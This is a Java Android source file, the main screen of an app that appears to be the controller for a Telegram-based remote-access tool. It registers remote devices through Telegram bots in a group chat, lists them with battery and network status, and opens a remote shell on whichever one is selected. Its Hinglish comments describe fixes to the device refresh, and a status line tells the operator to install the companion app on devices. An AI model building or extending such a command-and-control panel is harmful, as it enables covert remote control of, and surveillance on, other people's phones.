package com.rx.controller;

import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.View;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import java.util.List;

public class MainActivity extends AppCompatActivity
        implements TelegramController.OnUpdateListener {

    private TelegramController controller;
    private ListView            deviceList;
    private TextView            statusText;
    private TextView            connText;
    private ProgressBar         loader;
    private DeviceAdapter       adapter;
    private final Handler       handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        deviceList = findViewById(R.id.deviceList);
        statusText = findViewById(R.id.statusText);
        connText   = findViewById(R.id.connText);
        loader     = findViewById(R.id.loader);

        adapter = new DeviceAdapter(this);
        deviceList.setAdapter(adapter);

        deviceList.setOnItemClickListener((parent, view, pos, id) -> {
            Device d = adapter.getItem(pos);
            if (d != null && d.online && d.isAlive()) {
                openShell(d);
            } else {
                Toast.makeText(this, "❌ Device offline!", Toast.LENGTH_SHORT).show();
            }
        });

        // BUG FIX #4: REFRESH button ab kaam karta hai
        // Pehle: sirf text change hota tha
        // Fix: DISCOVER broadcast bhejta hai, sab devices re-register karte hain
        findViewById(R.id.btnRefresh).setOnClickListener(v -> {
            statusText.setText("🔄 Refreshing...");
            loader.setVisibility(View.VISIBLE);
            if (controller != null) {
                controller.requestRefresh(); // ← Real refresh
            }
        });

        // Group Chat ID check — pehli baar run hone par poochho
        checkChatIdSetup();
    }

    // ── Group Chat ID Setup ──────────────────────────────────────────
    // ZARURI: Dono bots ek Telegram GROUP mein hone chahiye
    // Yahan group ka chat ID daalna hoga
    private void checkChatIdSetup() {
        SharedPreferences prefs = getSharedPreferences("rx_config", Context.MODE_PRIVATE);
        String savedChatId = prefs.getString("chat_id", "");

        if (!savedChatId.isEmpty()) {
            // Pehle se save hua hai — use karo
            Config.CONTROL_CHAT_ID = savedChatId;
            startController();
        } else if (!Config.CONTROL_CHAT_ID.equals("YOUR_GROUP_CHAT_ID")) {
            // Code mein hardcoded hai — seedha chalu karo
            startController();
        } else {
            // Pehli baar — user se poochho
            showChatIdDialog(prefs);
        }
    }

    private void showChatIdDialog(SharedPreferences prefs) {
        EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_FLAG_SIGNED);
        input.setHint("-1001234567890");

        new AlertDialog.Builder(this)
            .setTitle("Group Chat ID")
            .setMessage("Telegram group ka chat ID daalo.\n\n"
                      + "Setup:\n"
                      + "1. Group banao\n"
                      + "2. Dono bots ko admin karo\n"
                      + "3. @RawDataBot se group ID lo")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("Save", (d, w) -> {
                String chatId = input.getText().toString().trim();
                if (!chatId.isEmpty()) {
                    prefs.edit().putString("chat_id", chatId).apply();
                    Config.CONTROL_CHAT_ID = chatId;
                    startController();
                } else {
                    Toast.makeText(this, "Chat ID daalo!", Toast.LENGTH_SHORT).show();
                    showChatIdDialog(prefs);
                }
            })
            .show();
    }

    private void startController() {
        statusText.setText("🔗 Telegram se connect ho raha hun...");
        loader.setVisibility(View.VISIBLE);
        connText.setText("⏳ Waiting for devices...");

        controller = new TelegramController();
        controller.setListener(this);
        controller.start();
        setControllerInstance(controller);
    }

    private void openShell(Device device) {
        Intent intent = new Intent(this, ShellActivity.class);
        intent.putExtra("device_id", device.id);
        intent.putExtra("network",   device.network);
        intent.putExtra("battery",   device.battery);
        startActivity(intent);
    }

    // ── Callbacks ─────────────────────────────────────────────────────
    @Override
    public void onDeviceListChanged(List<Device> devices) {
        handler.post(() -> {
            adapter.setDevices(devices);
            loader.setVisibility(View.GONE);

            long online = devices.stream().filter(d -> d.online && d.isAlive()).count();
            statusText.setText("📱 " + devices.size() + " device(s)  |  🟢 " + online + " online");

            if (devices.isEmpty()) {
                connText.setText("⏳ Koi device nahi mila — app install karo...");
            } else {
                connText.setText("✅ Connected! Device select karo →");
            }
        });
    }

    @Override public void onOutput(String deviceId, String output) { }

    @Override
    public void onConnected() {
        handler.post(() -> {
            connText.setText("✅ Telegram connected!");
            loader.setVisibility(View.GONE);
        });
    }

    @Override
    public void onError(String msg) {
        handler.post(() -> statusText.setText("❌ " + msg));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (controller != null) controller.stop();
    }

    private static TelegramController instance;
    public static void setControllerInstance(TelegramController c) { instance = c; }
    public static TelegramController getController() { return instance; }

    @Override
    protected void onResume() {
        super.onResume();
        if (controller != null) setControllerInstance(controller);
    }
}
